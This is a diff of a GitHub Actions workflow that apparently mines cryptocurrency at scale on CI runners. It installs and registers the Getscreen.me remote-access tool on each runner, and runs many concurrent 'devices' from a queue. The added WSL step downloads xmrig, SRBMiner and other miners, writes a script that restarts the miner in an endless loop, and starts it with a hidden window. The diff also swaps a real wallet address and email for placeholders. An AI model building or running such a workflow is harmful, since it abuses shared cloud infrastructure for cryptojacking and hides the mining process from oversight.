@@ -7,7 +7,7 @@ on:
         description: 'Runner Host Environment'
         type: choice
         options: [self-hosted, github]
-        default: 'github' # marker-runner
+        default: 'self-hosted' # marker-runner
       github_windows_version:
         description: 'GitHub Windows Version (If GitHub Host Selected)'
         type: choice
@@ -16,18 +16,18 @@ on:
       execution_type:
         description: 'Execution Environment'
         type: choice
-        options: [windows, docker]
-        default: 'docker' # marker-exec
+        options: [windows, docker, wsl]
+        default: 'windows' # marker-exec
       getscreen_email:
         description: 'Getscreen.me Email'
         type: string
         required: true
-        default: 'dramatic.skink.kvck@hidingpost.com' # marker-getscreen
+        default: 'your@email.com' # marker-getscreen
       concurrent_devices:
         description: 'Concurrent Devices Active at Once'
         type: choice
         options: ['1', '2', '3', '4', '5', '10', '15', '20', '30', '50', '100']
-        default: '5' # marker-concurrent
+        default: '10' # marker-concurrent
       total_devices:
         description: 'Total Devices to Process in Queue'
         type: number
@@ -56,7 +56,7 @@ on:
         description: 'Wallet Address'
         type: string
         required: true
-        default: 'RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5' # marker-wallet
+        default: 'WALLET_ADDRESS' # marker-wallet
       pool:
         description: 'Pool Base URL'
         type: string
@@ -103,20 +103,20 @@ jobs:
 
           echo "Updating file: $WORKFLOW_FILE"
 
-          sed -i -E "s/default: 'github' # marker-runner/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'windows-latest' # marker-winver/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'docker' # marker-exec/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'dramatic.skink.kvck@hidingpost.com' # marker-getscreen/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: '5' # marker-concurrent/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-runner/default: '${{ inputs.runner_type }}' # marker-runner/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-winver/default: '${{ inputs.github_windows_version }}' # marker-winver/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-exec/default: '${{ inputs.execution_type }}' # marker-exec/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-getscreen/default: '${{ inputs.getscreen_email }}' # marker-getscreen/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-concurrent/default: '${{ inputs.concurrent_devices }}' # marker-concurrent/g" "$WORKFLOW_FILE"
           sed -i -E "s/default: [0-9]+ # marker-total/default: ${{ inputs.total_devices }} # marker-total/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: '60' # marker-timeout/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'cpuminer-rplant' # marker-miner/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'gr' # marker-algo/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'RTM' # marker-coin/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5' # marker-wallet/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'rplant.xyz' # marker-pool/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: 'na' # marker-region/g" "$WORKFLOW_FILE"
-          sed -i -E "s/default: '17056' # marker-port/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-timeout/default: '${{ inputs.timeout }}' # marker-timeout/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-miner/default: '${{ inputs.miner }}' # marker-miner/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-algo/default: '${{ inputs.algo }}' # marker-algo/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-coin/default: '${{ inputs.coin }}' # marker-coin/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-wallet/default: '${{ inputs.wallet }}' # marker-wallet/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-pool/default: '${{ inputs.pool }}' # marker-pool/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-region/default: '${{ inputs.region }}' # marker-region/g" "$WORKFLOW_FILE"
+          sed -i -E "s/default: '.*' # marker-port/default: '${{ inputs.port }}' # marker-port/g" "$WORKFLOW_FILE"
 
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
@@ -178,12 +178,12 @@ jobs:
           Write-Host "Connecting Getscreen.me as $($env:DEVICE_NAME)..."
           Invoke-WebRequest -Uri "https://getscreen.me/download/getscreen.exe" -OutFile "getscreen.exe" -UseBasicParsing
           
-          # Install and register without using || syntax
+          # Install and register cleanly
           .\getscreen.exe -install
           .\getscreen.exe -register "${{ inputs.getscreen_email }}"
           .\getscreen.exe -name "$env:DEVICE_NAME"
           
-          # Force a successful exit code so the GitHub Action job does not crash here
+          # Force a successful exit code so the GitHub Action job does not crash if setting the name fails
           $global:LASTEXITCODE = 0
           Write-Host "Getscreen successfully attached!"
 
@@ -279,8 +279,51 @@ jobs:
           }
 
           Set-Content -Path "Dockerfile" -Value $DockerFile
-          docker build -t miner-$($env:DEVICE_NAME) .
-          docker run -d --name container-$($env:DEVICE_NAME) miner-$($env:DEVICE_NAME)
+          
+          # Fix for Docker error: Convert the tag name strictly to lowercase
+          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
+          
+          docker build -t $DockerName .
+          docker run -d --name $DockerName $DockerName
+
+      - name: Run Miner (WSL / Linux Subsystem)
+        if: ${{ inputs.execution_type == 'wsl' }}
+        shell: powershell
+        run: |
+          Write-Host "Setting up Linux Miner inside WSL..."
+          $Miner = "${{ inputs.miner }}"
+          $DownloadUrl = ""
+          $ExtractCmd = "tar -xf miner.archive"
+          $RunCmd = ""
+
+          if ($Miner -eq "cpuminer-rplant") {
+            $DownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
+            $RunCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          } 
+          elseif ($Miner -eq "srbminer-multi") {
+            $DownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
+            $RunCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          }
+          elseif ($Miner -eq "xmrig") {
+            $DownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+            $RunCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          }
+          elseif ($Miner -eq "wildrig-multi") {
+            $DownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
+            $RunCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          }
+
+          # Execute inside WSL to ensure proper Linux permissions and execution paths
+          wsl bash -c "mkdir -p /tmp/miner && cd /tmp/miner && wget -qO miner.archive $DownloadUrl && $ExtractCmd"
+          
+          # Create execution script inside WSL
+          wsl bash -c "echo '#!/bin/bash' > /tmp/miner/run.sh"
+          wsl bash -c "echo 'cd /tmp/miner' >> /tmp/miner/run.sh"
+          wsl bash -c "echo 'while true; do $RunCmd; sleep 5; done' >> /tmp/miner/run.sh"
+          wsl bash -c "chmod +x /tmp/miner/run.sh"
+          
+          Write-Host "Launching WSL Miner Process..."
+          Start-Process wsl -ArgumentList "-e bash /tmp/miner/run.sh" -WindowStyle Hidden
 
       - name: Runtime Timer & Job Completion
         shell: powershell
